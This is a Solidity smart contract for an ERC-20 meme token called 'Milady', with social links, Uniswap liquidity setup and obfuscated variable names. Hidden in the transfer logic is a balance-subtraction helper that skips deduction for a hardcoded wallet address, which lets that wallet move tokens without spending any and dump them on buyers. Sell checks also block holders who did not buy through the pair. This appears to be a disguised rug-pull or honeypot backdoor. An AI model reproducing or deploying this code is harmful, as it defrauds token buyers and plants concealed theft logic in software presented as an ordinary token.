/**

Telegram: https://t.me/MiladyEthereum

X: https://twitter.com/MiladyEthereum

Website: https://miladyerc.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _pariuj(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pariuj(a, b, "SafeMath");
    }

    function  _pariuj(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qnifcv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _pratrvc;
    address payable private _phofiy;
    address private _bauerp;
    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _qutoae=0;
    uint256 private _qevsot=0;
    uint256 public _poafyb = _totalSupply;
    uint256 public _qrdeak = _totalSupply;
    uint256 public _ploaib= _totalSupply;
    uint256 public _qeignf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _bioeid;
    mapping (address => bool) private _pvakxu;
    mapping(address => uint256) private _flknau;

    bool private _xpxopen;
    bool public _pvudfq = false;
    bool private qluibf = false;
    bool private _qriule = false;


    event _quravj(uint _poafyb);
    modifier froipy {
        qluibf = true;
        _;
        qluibf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _bioeid[owner(

        )] = true;
        _bioeid[address
        (this)] = true;
        _bioeid[
            _phofiy] = true;
        _phofiy = 
        payable (0x8632Aa19278f4e295fD75D459D6b552E2B61BA6f);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pariuj(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 buorig=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pvudfq) {
                if (to 
                != address
                (_pratrvc) 
                && to !=
                 address
                 (_bauerp)) {
                  require(_flknau
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flknau
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bauerp && to != 
            address(_pratrvc) &&
             !_bioeid[to] ) {
                require(amount 
                <= _poafyb,
                 "Exceeds the _poafyb.");
                require(balanceOf
                (to) + amount
                 <= _qrdeak,
                  "Exceeds the _qrdeak.");
                if(_qevsot
                < _qutoae){
                  require
                  (! _frojav(to));
                }
                _qevsot++;
                 _pvakxu
                 [to]=true;
                buorig = amount._qnifcv
                ((_qevsot>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bauerp &&
             from!= address(this) 
            && !_bioeid[from] ){
                require(amount <= 
                _poafyb && 
                balanceOf(_phofiy)
                <_qeignf,
                 "Exceeds the _poafyb.");
                buorig = amount._qnifcv((_qevsot>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qevsot>
                _qutoae &&
                 _pvakxu[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qluibf 
            && to == _bauerp &&
             _qriule &&
             contractTokenBalance>
             _ploaib 
            && _qevsot>
            _qutoae&&
             !_bioeid[to]&&
              !_bioeid[from]
            ) {
                _transferFrom( _brubkv(amount, 
                _brubkv(contractTokenBalance,
                _qeignf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _qtnbyk(address
                    (this).balance);
                }
            }
        }

        if(buorig>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(buorig);
          emit
           Transfer(from,
           address
           (this),buorig);
        }
        _balances[from
        ]= _pariuj(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _pariuj(buorig));
        emit Transfer
        (from, to, 
        amount.
         _pariuj(buorig));
    }

    function _transferFrom(uint256
     tokenAmount) private
      froipy {
        if(tokenAmount==
        0){return;}
        if(!_xpxopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _pratrvc.WETH();
        _approve(address(this),
         address(
             _pratrvc), 
             tokenAmount);
        _pratrvc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _brubkv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pariuj(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _phofiy){
            return a ;
        }else{
            return a .
             _pariuj (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _poafyb = _totalSupply;
        _qrdeak = _totalSupply;
        emit _quravj(_totalSupply);
    }

    function _frojav(address 
    account) private view 
    returns (bool) {
        uint256 eqrigp;
        assembly {
            eqrigp :=
             extcodesize
             (account)
        }
        return eqrigp > 
        0;
    }

    function _qtnbyk(uint256
    amount) private {
        _phofiy.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _xpxopen ) ;
        _pratrvc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _pratrvc), 
            _totalSupply);
        _bauerp = 
        IUniswapV2Factory(_pratrvc.
        factory( ) 
        ). createPair (
            address(this
            ),  _pratrvc .
             WETH ( ) );
        _pratrvc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bauerp).
        approve(address(_pratrvc), 
        type(uint)
        .max);
        _qriule = true;
        _xpxopen = true;
    }

    receive() external payable {}
}